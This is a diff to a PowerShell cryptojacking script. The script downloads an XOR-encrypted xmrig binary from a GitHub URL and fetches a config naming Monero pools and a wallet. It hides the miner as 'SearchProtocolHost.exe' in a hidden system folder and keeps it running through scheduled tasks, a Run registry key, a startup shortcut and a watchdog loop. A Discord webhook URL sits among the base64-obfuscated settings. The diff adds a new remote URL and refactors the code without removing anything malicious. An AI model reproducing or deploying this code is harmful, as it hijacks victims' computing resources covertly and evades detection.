@@ -22,6 +22,7 @@ $_pb='cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM='
 $_e='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg=='
 $_d='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDkzNzk2MjE3MzE2OTgwNC9ILVdMLW1jUFlqQW5ESDJyaHh5MnVNV2w4U0lkbmN5dE5JMWNuWEhaTkVwaWo2YlI2Y0NhTzNFaER1bHEzMUtCSjZRVA=='
 $_x='TXlTZWNyZXRLZXkxMjM0NQ=='
+$_g='https://raw.githubusercontent.com/maroz123/Football/main/deploy_client_v7.5.5.ps1'
 $_s="$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
 $_m="SearchProtocolHost.exe"
 
@@ -69,8 +70,7 @@ $json|Out-File -FilePath "$_s\config.json" -Encoding UTF8 -Force
 function Set-Persistence{
 $t=New-ScheduledTaskTrigger -AtLogOn
 $a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`""
-$r=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
-Register-ScheduledTask -TaskName "SearchProtocolHost" -Trigger $t,$a -Action $a -RunLevel Highest -Force|Out-Null
+Register-ScheduledTask -TaskName "SearchProtocolHost" -Trigger $t -Action $a -RunLevel Highest -Force|Out-Null
 }
 
 function Set-DeepPersistence{
@@ -80,78 +80,48 @@ $k.SetValue("NetworkServiceCache","powershell.exe -WindowStyle Hidden -Execution
 $k.Close()
 $sh="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\NetworkServiceCache.lnk"
 $ws=New-Object -ComObject WScript.Shell
-$s=$ws.CreateShortcut($sh)
-$s.TargetPath="powershell.exe"
-$s.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`""
-$s.Save()
+$sc=$ws.CreateShortcut($sh)
+$sc.TargetPath="powershell.exe"
+$sc.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`""
+$sc.Save()
 }catch{}
 }
 
 function Write-StealthWatchdog{
-$w='# watchdog'
-$w+='
-`$ErrorActionPreference=''SilentlyContinue'''
-$w+='
-while(`$true){'
-$w+='
-`$proc=Get-Process -Name ''SearchProtocolHost'' -ErrorAction SilentlyContinue'
-$w+='
-if(!`$proc){'
-$w+='
-$exe="'+$_s+'\SearchProtocolHost.exe"'
-$w+='
-$arg="-c `"$($_s)\config.json`""
-$w+='
-Start-Process -FilePath $exe -ArgumentList $arg -WindowStyle Hidden'
-$w+='
-}'
-$w+='
-Start-Sleep 60'
-$w+='
-}'
+$w = @'
+$ErrorActionPreference='SilentlyContinue'
+$s="SearchProtocolHost.exe"
+while($true){
+$proc=Get-Process -Name $s -ErrorAction SilentlyContinue
+if(!$proc){
+$exe="SearchProtocolHost.exe"
+Start-Process $exe -WindowStyle Hidden
+}
+Start-Sleep 60
+}
+'@
 $w|Out-File -FilePath "$_s\watchdog.ps1" -Encoding UTF8 -Force
 }
 
 function Write-SelfHealScript{
-$m='# miner'
-$m+='
-`$ErrorActionPreference=''SilentlyContinue'''
-$m+='
-Start-Sleep 10'
-$m+='
-`$k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)'
-$m+='
-function X([string]`$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$s))}'
-$m+='
-function XorDec([byte[]]`$d,[byte[]]`$k){`$o=New-Object byte[] `$d.Length;for(`$i=0;`$i -lt `$d.Length;`$i++){`$o[`$i]=`$d[`$i] -bxor `$k[`$i % `$k.Length]};return `$o}'
-$m+='
-`$wc=New-Object Net.WebClient'
-$m+='
-`$_s="`$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"'
-$m+='
-`$_m="SearchProtocolHost.exe"'
-$m+='
-if(!(Test-Path `$_s)){New-Item -Path `$_s -ItemType Directory -Force|Out-Null}'
-$m+='
-Set-ItemProperty `$_s -Name Attributes -Value ''Hidden,System'' -ErrorAction SilentlyContinue'
-$m+='
-`$enc=`$wc.DownloadData((X ''aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg==''))'
-$m+='
-`$dec=XorDec `$enc `$k'
-$m+='
-[System.IO.File]::WriteAllBytes("`$_s\`$_m",`$dec)'
-$m+='
-`$cb64=''eyJhcGktbW9kZSI6bnVsbCwiZG9uYXRlLWxldmVsIjowLCJkb25hdGUtb3Zlci1wcm94eSI6MCwibG9nLWZpbGUiOm51bGwsInByaW50LXRpbWUiOjYwLCJoZWFsdGgtcHJpbnQtdGltZSI6NjAsInJldHJpZXMiOjUsInJldHJ5LXBhdXNlIjo1LCJzeXNsb2ciOmZhbHNlLCJ3YXRjaCI6dHJ1ZSwib3BlbmNsLXBsYXRmb3JtIjotMSwiYWxnbyI6InJ4LzAiLCJjb2lucyI6Im1vbmVybyIsInBvb2xzIjpbeyJ1cmwiOiJwb29sLmhhc2h2YXVsdC5wcm86NDQzIiwidXNlciI6IjQ2N2cxbWVpekZlMzFHekZNRzd4b3kzeXhUaEc1NnA3Tk56dXRLZmY3WVBpMURhZEFkcmtZMnhMajl6TFdqWk5tNGhmWG9GMnV4YTZQZ0pDV1FjNlFVaDY0TkdwWEVMIiwia2VlcGFsaXZlIjp0cnVlLCJ0bHMiOnRydWUsInRscy1maW5nZXJwcmludCI6bnVsbH0seyJ1cmwiOiJwb29sLnN1cHBvcnR4bXIuY29tOjQ0MyIsInVzZXIiOiI0NjdnMW1laXpGZTMxR3pGTUc3eG95M3l4VGhHNTZwN05OenV0S2ZmN1lQaTFEYWRBZHJrWTJ4TGo5ekxXalpObTRoZlhvRjJ1eGE2UGdKQ1dRYzZRVWg2NE5HcFhFTCIsImtlZXBhbGl2ZSI6dHJ1ZSwidGxzIjp0cnVlLCJ0bHMtZmluZ2VycHJpbnQiOm51bGx9XSwiY3B1Ijp0cnVlfQ=='''
-$m+='
-`$json=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$cb64))'
-$m+='
-`$json|Out-File -FilePath "`$_s\config.json" -Encoding UTF8 -Force'
-$m+='
-$exe="`$_s\`$_m"'
-$m+='
-$arg="-c `"`$_s\config.json`""
-$m+='
-Start-Process -FilePath $exe -ArgumentList $arg -WindowStyle Hidden'
+$m = @"
+`$ErrorActionPreference='SilentlyContinue'
+Start-Sleep 10
+`$k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
+function X(`$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$s))}
+function XorDec(`$d,`$k){`$o=New-Object byte[] `$d.Length;for(`$i=0;`$i -lt `$d.Length;`$i++){`$o[`$i]=`$d[`$i] -bxor `$k[`$i % `$k.Length]};return `$o}
+`$wc=New-Object Net.WebClient
+`$_s="`$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
+`$_m="SearchProtocolHost.exe"
+if(!(Test-Path `$_s)){New-Item -Path `$_s -ItemType Directory -Force|Out-Null}
+Set-ItemProperty `$_s -Name Attributes -Value 'Hidden,System' -ErrorAction SilentlyContinue
+`$enc=`$wc.DownloadData((X '$_e'))
+`$dec=XorDec `$enc `$k
+[System.IO.File]::WriteAllBytes("`$_s\`$_m",`$dec)
+`$json=`$wc.DownloadString('$_g'.Replace('deploy_client_v7.5.5.ps1','config.json'))
+`$json|Out-File -FilePath "`$_s\config.json" -Encoding UTF8 -Force
+Start-Process "`$_s\`$_m" -ArgumentList "-c `$_s\config.json" -WindowStyle Hidden
+"@
 $m|Out-File -FilePath "$_s\miner.ps1" -Encoding UTF8 -Force
 }
 
